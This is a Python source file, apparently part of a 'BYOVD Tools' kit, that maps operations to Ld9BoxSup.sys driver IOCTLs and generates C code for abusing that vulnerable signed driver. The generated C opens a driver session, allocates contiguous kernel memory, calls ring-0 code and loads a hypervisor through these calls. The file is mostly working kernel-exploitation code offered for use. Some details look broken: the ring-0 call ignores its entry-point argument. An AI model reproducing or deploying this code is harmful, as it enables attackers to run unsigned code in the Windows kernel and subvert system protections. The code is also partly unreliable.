"""
BYOVD Tools - Ld9BoxSup.sys (VirtualBox SUPDrv) Integration
"""

import json
from pathlib import Path

DATA_DIR = Path(__file__).parent.parent / "data"


def load_ioctl_db():
    """Load IOCTL database."""
    path = DATA_DIR / "ld9boxsup_ioctls.json"
    if path.exists():
        return json.loads(path.read_text())
    return {}


def ld9boxsup_ioctl_guide(operation: str) -> dict:
    """
    Get complete guide for Ld9BoxSup.sys IOCTL.
    Operations: cookie, alloc_memory, load_module, call_ring0, read_msr, etc.
    """
    db = load_ioctl_db()

    # Map operations to IOCTLs
    op_map = {
        "cookie": "SUP_IOCTL_COOKIE",
        "session": "SUP_IOCTL_COOKIE",
        "alloc": "SUP_IOCTL_CONT_ALLOC",
        "alloc_memory": "SUP_IOCTL_CONT_ALLOC",
        "alloc_pages": "SUP_IOCTL_PAGE_ALLOC_EX",
        "free": "SUP_IOCTL_CONT_FREE",
        "load": "SUP_IOCTL_LDR_LOAD",
        "load_module": "SUP_IOCTL_LDR_LOAD",
        "open": "SUP_IOCTL_LDR_OPEN",
        "symbol": "SUP_IOCTL_LDR_GET_SYMBOL",
        "call": "SUP_IOCTL_CALL_VMMR0",
        "call_ring0": "SUP_IOCTL_CALL_VMMR0",
        "execute": "SUP_IOCTL_CALL_VMMR0",
        "msr": "SUP_IOCTL_MSR_PROBER",
        "read_msr": "SUP_IOCTL_MSR_PROBER",
        "write_msr": "SUP_IOCTL_MSR_PROBER",
        "vt_caps": "SUP_IOCTL_VT_CAPS",
        "vmx_caps": "SUP_IOCTL_VT_CAPS",
        "hwvirt_msrs": "SUP_IOCTL_GET_HWVIRT_MSRS",
        "vmx_msrs": "SUP_IOCTL_GET_HWVIRT_MSRS",
    }

    operation = operation.lower().replace("-", "_").replace(" ", "_")
    ioctl_name = op_map.get(operation)

    if not ioctl_name and db.get("ioctls"):
        # Direct IOCTL name lookup
        for name in db["ioctls"]:
            if operation.upper() in name:
                ioctl_name = name
                break

    if not ioctl_name:
        return {"error": f"Unknown operation: {operation}", "available": list(op_map.keys())}

    if db.get("ioctls") and ioctl_name in db["ioctls"]:
        ioctl = db["ioctls"][ioctl_name]
        return {
            "name": ioctl_name,
            "code": ioctl.get("code"),
            "description": ioctl.get("description"),
            "input": ioctl.get("input"),
            "output": ioctl.get("output"),
            "notes": ioctl.get("notes"),
            "usage": ioctl.get("usage")
        }

    return {"name": ioctl_name, "error": "IOCTL details not in database"}


def generate_driver_wrapper() -> str:
    """Generate C code for Ld9BoxSup.sys driver interface."""
    code = []
    code.append("// Ld9BoxSup.sys Driver Interface Wrapper")
    code.append("// BYOVD interface for kernel memory and execution")
    code.append("")
    code.append("#include <windows.h>")
    code.append("")
    code.append("#define DEVICE_PATH L\"\\\\\\\\.\\\\Ld9BoxSup\"")
    code.append("#define SUP_MAGIC \"The Magic Word!\"")
    code.append("")
    code.append("// IOCTL codes")
    code.append("#define SUP_IOCTL_COOKIE          0x22A000")
    code.append("#define SUP_IOCTL_LDR_OPEN        0x22A004")
    code.append("#define SUP_IOCTL_LDR_LOAD        0x22A008")
    code.append("#define SUP_IOCTL_CONT_ALLOC      0x22A014")
    code.append("#define SUP_IOCTL_PAGE_ALLOC_EX   0x22A028")
    code.append("#define SUP_IOCTL_CALL_VMMR0      0x22A03C")
    code.append("#define SUP_IOCTL_GET_HWVIRT_MSRS 0x22A054")
    code.append("#define SUP_IOCTL_MSR_PROBER      0x22A068")
    code.append("")
    code.append("typedef struct _SUP_SESSION {")
    code.append("    HANDLE hDevice;")
    code.append("    ULONG32 Cookie;")
    code.append("    ULONG32 SessionCookie;")
    code.append("    PVOID pSession;")
    code.append("} SUP_SESSION, *PSUP_SESSION;")
    code.append("")
    code.append("BOOL SupOpenSession(PSUP_SESSION Session) {")
    code.append("    Session->hDevice = CreateFileW(")
    code.append("        DEVICE_PATH,")
    code.append("        GENERIC_READ | GENERIC_WRITE,")
    code.append("        0,")
    code.append("        NULL,")
    code.append("        OPEN_EXISTING,")
    code.append("        FILE_ATTRIBUTE_NORMAL,")
    code.append("        NULL);")
    code.append("")
    code.append("    if (Session->hDevice == INVALID_HANDLE_VALUE)")
    code.append("        return FALSE;")
    code.append("")
    code.append("    // Exchange cookies")
    code.append("    struct {")
    code.append("        char szMagic[16];")
    code.append("        ULONG32 u32ReqVersion;")
    code.append("    } cookieIn = { SUP_MAGIC, 0x00290000 };")
    code.append("")
    code.append("    struct {")
    code.append("        ULONG32 Cookie;")
    code.append("        ULONG32 SessionCookie;")
    code.append("        ULONG32 SessionVersion;")
    code.append("        ULONG32 DriverVersion;")
    code.append("        PVOID pSession;")
    code.append("    } cookieOut = {0};")
    code.append("")
    code.append("    DWORD bytes;")
    code.append("    if (!DeviceIoControl(Session->hDevice, SUP_IOCTL_COOKIE,")
    code.append("            &cookieIn, sizeof(cookieIn),")
    code.append("            &cookieOut, sizeof(cookieOut),")
    code.append("            &bytes, NULL)) {")
    code.append("        CloseHandle(Session->hDevice);")
    code.append("        return FALSE;")
    code.append("    }")
    code.append("")
    code.append("    Session->Cookie = cookieOut.Cookie;")
    code.append("    Session->SessionCookie = cookieOut.SessionCookie;")
    code.append("    Session->pSession = cookieOut.pSession;")
    code.append("    return TRUE;")
    code.append("}")
    code.append("")
    code.append("BOOL SupAllocContiguous(PSUP_SESSION Session, ULONG Pages,")
    code.append("    PVOID* pR3, PVOID* pR0, ULONG64* pPhys) {")
    code.append("")
    code.append("    struct { ULONG32 cPages; } allocIn = { Pages };")
    code.append("    struct {")
    code.append("        PVOID pvR3;")
    code.append("        PVOID pvR0;")
    code.append("        ULONG64 HCPhys;")
    code.append("    } allocOut = {0};")
    code.append("")
    code.append("    DWORD bytes;")
    code.append("    if (!DeviceIoControl(Session->hDevice, SUP_IOCTL_CONT_ALLOC,")
    code.append("            &allocIn, sizeof(allocIn),")
    code.append("            &allocOut, sizeof(allocOut),")
    code.append("            &bytes, NULL))")
    code.append("        return FALSE;")
    code.append("")
    code.append("    *pR3 = allocOut.pvR3;")
    code.append("    *pR0 = allocOut.pvR0;")
    code.append("    *pPhys = allocOut.HCPhys;")
    code.append("    return TRUE;")
    code.append("}")
    code.append("")
    code.append("BOOL SupCallRing0(PSUP_SESSION Session, PVOID EntryPoint, PVOID Arg) {")
    code.append("    struct {")
    code.append("        PVOID pVMR0;")
    code.append("        ULONG32 idCpu;")
    code.append("        ULONG32 uOperation;")
    code.append("        PVOID pvArg;")
    code.append("        ULONG32 cbArg;")
    code.append("    } callIn = { NULL, (ULONG32)-1, 0, Arg, sizeof(PVOID) };")
    code.append("")
    code.append("    DWORD bytes;")
    code.append("    return DeviceIoControl(Session->hDevice, SUP_IOCTL_CALL_VMMR0,")
    code.append("        &callIn, sizeof(callIn), NULL, 0, &bytes, NULL);")
    code.append("}")

    return "\n".join(code)


def generate_hypervisor_loader() -> str:
    """Generate hypervisor loader using BYOVD."""
    code = []
    code.append("// Hypervisor Loader via Ld9BoxSup.sys")
    code.append("")
    code.append("BOOL LoadHypervisor(PSUP_SESSION Session, PVOID HypervisorCode, SIZE_T Size) {")
    code.append("    PVOID pvR3, pvR0;")
    code.append("    ULONG64 phys;")
    code.append("    ULONG pages = (ULONG)((Size + 0xFFF) / 0x1000);")
    code.append("")
    code.append("    // Allocate kernel memory for hypervisor")
    code.append("    if (!SupAllocContiguous(Session, pages, &pvR3, &pvR0, &phys)) {")
    code.append("        printf(\"Failed to allocate kernel memory\\n\");")
    code.append("        return FALSE;")
    code.append("    }")
    code.append("")
    code.append("    printf(\"Allocated %lu pages at R0=%p, Phys=0x%llX\\n\", pages, pvR0, phys);")
    code.append("")
    code.append("    // Copy hypervisor code via R3 mapping")
    code.append("    memcpy(pvR3, HypervisorCode, Size);")
    code.append("")
    code.append("    // Allocate per-CPU structures")
    code.append("    SYSTEM_INFO si;")
    code.append("    GetSystemInfo(&si);")
    code.append("    ULONG cpuCount = si.dwNumberOfProcessors;")
    code.append("")
    code.append("    // VMXON regions (4KB each)")
    code.append("    PVOID vmxonR3, vmxonR0;")
    code.append("    ULONG64 vmxonPhys;")
    code.append("    if (!SupAllocContiguous(Session, cpuCount, &vmxonR3, &vmxonR0, &vmxonPhys)) {")
    code.append("        printf(\"Failed to allocate VMXON regions\\n\");")
    code.append("        return FALSE;")
    code.append("    }")
    code.append("")
    code.append("    // VMCS regions (4KB each)")
    code.append("    PVOID vmcsR3, vmcsR0;")
    code.append("    ULONG64 vmcsPhys;")
    code.append("    if (!SupAllocContiguous(Session, cpuCount, &vmcsR3, &vmcsR0, &vmcsPhys)) {")
    code.append("        printf(\"Failed to allocate VMCS regions\\n\");")
    code.append("        return FALSE;")
    code.append("    }")
    code.append("")
    code.append("    // Build init params")
    code.append("    typedef struct {")
    code.append("        PVOID HypervisorBase;")
    code.append("        ULONG64 VmxonPhysBase;")
    code.append("        ULONG64 VmcsPhysBase;")
    code.append("        ULONG CpuCount;")
    code.append("    } HV_INIT_PARAMS;")
    code.append("")
    code.append("    HV_INIT_PARAMS params = {")
    code.append("        .HypervisorBase = pvR0,")
    code.append("        .VmxonPhysBase = vmxonPhys,")
    code.append("        .VmcsPhysBase = vmcsPhys,")
    code.append("        .CpuCount = cpuCount")
    code.append("    };")
    code.append("")
    code.append("    // Call hypervisor entry point at ring 0")
    code.append("    printf(\"Launching hypervisor...\\n\");")
    code.append("    if (!SupCallRing0(Session, pvR0, &params)) {")
    code.append("        printf(\"Failed to execute ring 0 entry\\n\");")
    code.append("        return FALSE;")
    code.append("    }")
    code.append("")
    code.append("    printf(\"Hypervisor loaded successfully\\n\");")
    code.append("    return TRUE;")
    code.append("}")

    return "\n".join(code)
